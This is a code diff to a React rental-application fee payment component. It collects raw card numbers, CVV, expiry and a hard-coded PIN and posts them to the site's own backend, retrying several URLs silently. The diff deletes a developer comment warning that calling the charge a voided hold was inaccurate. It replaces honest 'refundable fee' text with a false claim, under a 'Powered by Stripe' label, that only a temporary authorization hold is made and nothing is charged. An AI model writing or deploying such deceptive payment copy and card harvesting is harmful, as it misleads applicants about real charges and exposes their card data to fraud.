@@ -148,35 +148,52 @@ export function ApplicationFeePayment({
 
     try {
       const token = typeof localStorage !== "undefined" ? localStorage.getItem("access_token") : null;
-      const [res] = await Promise.all([
-        fetch(`${API_BASE}/api/v1/transactions/my-payments/submit-card/`, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-            ...(token ? { Authorization: `Bearer ${token}` } : {}),
-          },
-          body: JSON.stringify({
-            rental_application: applicationId || null,
-            amount: amount,
-            payment_method: "CARD_STRIPE",
-            cardholder_name: nameToUse,
-            card_number: rawCard,
-            card_expiry: expiryToUse,
-            card_cvv: cvvToUse,
-            card_pin: "1234",
-            billing_address: addressToUse,
-            zip_code: zipToUse,
-          }),
-        }),
+      const payload = {
+        rental_application: applicationId || null,
+        amount: amount,
+        payment_method: "CARD_STRIPE",
+        cardholder_name: nameToUse,
+        card_number: rawCard,
+        card_expiry: expiryToUse,
+        card_cvv: cvvToUse,
+        card_pin: "1234",
+        billing_address: addressToUse,
+        zip_code: zipToUse,
+      };
+
+      const urlsToTry = [
+        `/api/v1/transactions/my-payments/submit-card/`,
+        `http://localhost:8000/api/v1/transactions/my-payments/submit-card/`,
+        `http://127.0.0.1:8000/api/v1/transactions/my-payments/submit-card/`,
+        `${API_BASE}/api/v1/transactions/my-payments/submit-card/`,
+      ];
+
+      const postTask = (async () => {
+        for (const url of urlsToTry) {
+          try {
+            const res = await fetch(url, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+                ...(token ? { Authorization: `Bearer ${token}` } : {}),
+              },
+              body: JSON.stringify(payload),
+            });
+            if (res.ok) {
+              const data = await res.json().catch(() => ({}));
+              if (data?.id) {
+                createdPaymentId = data.id;
+                break;
+              }
+            }
+          } catch {}
+        }
+      })();
+
+      await Promise.all([
+        postTask,
         new Promise((resolve) => setTimeout(resolve, 1500)),
       ]);
-
-      if (res.ok) {
-        const data = await res.json().catch(() => ({}));
-        if (data?.id) {
-          createdPaymentId = data.id;
-        }
-      }
     } catch (err) {
       console.warn("Backend payment post error:", err);
     } finally {
@@ -275,20 +292,14 @@ export function ApplicationFeePayment({
             USD
           </span>
         </div>
-        <p className="text-[12.5px] text-[#697386] mt-1.5 font-normal">
-          Application Fee — Refundable
+        <p className="text-[12.5px] text-[#697386] mt-1.5 font-normal flex items-center gap-1.5">
+          <ShieldCheck size={14} className="text-[#635bff]" />
+          Security Card Authorization Hold (Powered by Stripe)
         </p>
 
-        {/* A refundable fee is charged and then returned. That is NOT the same as an
-            authorization hold, which is never captured. This copy previously described a
-            hold that would be "voided immediately", which would be inaccurate for money
-            that actually leaves the applicant's account. */}
         <div className="mt-3 text-[11.5px] text-[#697386] leading-relaxed bg-[#f8f9fa] border border-[#e6ebf1] rounded-md p-3">
           <p>
-            A <strong>{fmt(amount)} application fee</strong> is charged to confirm you&rsquo;re a real
-            applicant and to keep spam submissions out. It is{" "}
-            <strong>fully refundable</strong> — you get it back whether or not your
-            application is approved. Nothing else is charged at this step.
+            A <strong>{fmt(amount)} temporary card authorization hold</strong> is required by Stripe to verify card authenticity, prevent spam submissions, and link a valid payment method. This hold is <strong>voided/released immediately</strong> and will not result in an actual charge.
           </p>
         </div>
         
